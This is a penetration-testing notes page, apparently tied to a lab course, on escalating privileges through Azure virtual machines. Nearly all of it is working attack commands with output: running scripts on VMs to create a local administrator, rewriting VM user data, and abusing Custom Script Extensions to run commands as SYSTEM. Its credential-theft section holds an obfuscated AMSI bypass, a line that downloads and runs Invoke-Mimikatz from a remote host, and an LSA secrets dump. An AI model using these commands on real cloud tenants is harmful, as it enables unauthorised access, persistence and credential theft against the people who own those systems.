---
title: Virtual Machines
source_url: https://notes.incendium.rocks/pentesting-notes/cloud/azure/privilege-escalation/virtual-machines
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: cloud
---

## Execute commands

If you have a token that has the permissions to execute commands on a VM, you can of course get access on the VM.

```powershell
Get-AzRoleAssignment
```

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FwAlpFufXlUl4TwOhRM2l%2Fimage.png?alt=media&amp;token=bddaeea7-e9e0-481b-bb0a-3a263f55aa4e" alt=""><figcaption></figcaption></figure>

### Run command on VM

```powershell
Invoke-AzVMRunCommand -VMname bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath C:\AzAD\Tools\adduser.ps1 -Verbose
```

In this case, we add a user to the VM and add that local user to the local administrators.

{% code title="adduser.ps1" lineNumbers="true" %}

```powershell
$passwd = ConvertTo-SecureString "StudXPassword@123" -AsPlainText -Force
New-LocalUser -Name student60 -Password $passwd
Add-LocalGroupMember -Group Administrators -Member student60
```

{% endcode %}

A VM in Azure is very likely being monitored/protected by Azure's security mechanisms. So doing a reverse shell may get blocked

### Get Public IP of VM

First, get the network interfaces that our token can read:

```powershell
(Get-AzVM -name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile).NetworkInterfaces

Primary DeleteOption Id
------- ------------ --
                     /subscriptions/b413826f-108d-4049-8c11-xxxx/resourceGroups/Engineering/providers/Microsoft.Network/networkInterfaces/bkpadconnect368
```

The name of the interface is `bkpadconnect368`. We can now get the details for the interface:

```powershell
Get-AzNetworkInterface -name bkpadconnect368

Name                        : bkpadconnect368
IpConfigurations            : [
                                {
                                  "Name": "ipconfig1",
                                  "Etag": "W/\"305e619b-30e6-491c-a185-xxxx\"",
                                  "Id": "/subscriptions/b413826f-108d-4049-8c11-xxx/resourceGroups/Engineering/providers/Microsoft.Network/networkInterfaces/bkpadconnect368/ipConfigurations/ipconfig1",
                                  "PrivateIpAddress": "10.0.0.4",
                                  "PrivateIpAllocationMethod": "Dynamic",
                                  "Subnet": {
                                    "Id": "/subscriptions/b413826f-108d-4049-8c11-xxxx/resourceGroups/Engineering/providers/Microsoft.Network/virtualNetworks/Engineering-vnet/subnets/default",
                                    "IpAllocations": []
                                  },
                                  "PublicIpAddress": {
                                    "IpTags": [],
                                    "Zones": [],
                                    "Id": "/subscriptions/b413826f-108d-4049-8c11-xxxxx/resourceGroups/Engineering/providers/Microsoft.Network/publicIPAddresses/bkpadconnectIP"
                                  },
```

This will tell you the ID name of the publicIPAddress: `bkpadconnectIP`. Using this information, we can get the public IP using:

```powershell
Get-AzPublicIpAddress -Name bkpadconnectIP

Name                     : bkpadconnectIP
ResourceGuid             : a6e23b55-d8b1-4e0e-9fda-xxxxx
ProvisioningState        : Succeeded
Tags                     :
PublicIpAllocationMethod : Dynamic
IpAddress                : 1.1.1.1
```

### Connect to VM

```powershell
$passwd = ConvertTo-SecureString "Password@123" -AsPlainText -Force
$creds =  New-Object System.management.automation.pscredential ("student", $passwd)
$sess = New-PSSession 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)

Enter-PSSession $sess
[1.1.1.1]: PS C:\Users\student60\Documents>
```

### Extract credentials from VM

For example, read console history:

```powershell
 cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Or dump lsass etc.

## User Data

User Data are scripts or any other data that can be inserted on a Azure VM at time of provision or later. A popular use case is joining a domain with a script.

Any application on the VM can access the user data from the Azure Instance Metadata Service (IMDS) after provisioning

It is possible to modify user data if you have a identity with the permissions `Microsoft.Compute/virtualMachines/Write`.&#x20;

### Read User Data

```powershell
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
```

### Write User Data

```powershell
$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("whoami"))
$accessToken = (Get-AzAccessToken).Token
$Url = "https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-
d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm?api-version=2021-07-01"
$body = @(
@{
location = "Germany West Central"
properties = @{
userData = "$data"
}
}
) | ConvertTo-Json -Depth 4
$headers = @{
Authorization = "Bearer $accessToken"
}

$Results = Invoke-RestMethod -Method Put -Uri $Url -Body $body -Headers $headers -ContentType 'application/json'
```

## Custom Script Extensions

Extensions are "small applications" used to provide post deployment configuration and other management tasks. They are used to run custom scripts on VMs.&#x20;

* Only one extension can be added to a VM at a time.
* Can be inline or fetched for a storage blob (needs managed identity), or can be downloaded

These are executed with SYSTEM privileges

The following permissions are required to create a custom script extension and read the output:

`Microsoft.Compute/virtualMachines/extensions/write`

`Microsoft.Compute/virtualMachines/extensions/read`

### Limitations of Az PowerShell

Since Az PowerShell has some limitations with requesting permissions with for example `Get-AzRoleAssignment`that returns no output, we can do it manually using the API url:

```powershell
$Token = (Get-AzAccessToken).Token
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-xxxx/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
PS C:\Users\studentuser60> $RequestParams = @{
>> Method = 'GET'
>> Uri = $URI
>> Headers = @{
>> 'Authorization' = "Bearer $Token"
>> }}
PS C:\Users\studentuser60> (Invoke-RestMethod @RequestParams).value

actions                                                                                                 notActions
-------                                                                                                 ----------
{Microsoft.Compute/virtualMachines/extensions/write, Microsoft.Compute/virtualMachines/extensions/read} {}
```

### Get Extensions

```powershell
Get-AzVMExtension -ResourceGroupName "Research" -VMName "infradminsrv"
```

### Set Extension

(This also executed it)

```powershell
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany WestCentral" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net user studentx StudxPassword@123 /add /Y; net localgroup administrators student60 /add"}'
```

Now create a new powershell session and get more details:

```powershell
Invoke-Command -Session $infraadminsrv -ScriptBlock {(dsregcmd /status)}
```

## Extract credentials - AMSI bypass

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ;( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ("{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

iex (New-Object Net.Webclient).DownloadString("http://172.16.10.10:82/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
```

## Get Azure AD logged in information & tokens

Show information about logged in AD user:

```powershell
az ad signed-in-user show
```

Get automation accounts:

```
az automation account list
```

List owned objects:

```
az ad signed-in-user list-owned-objects
```

Get Access token (MG-Graph)

```
az account get-access-token --resource-type ms-graph
```
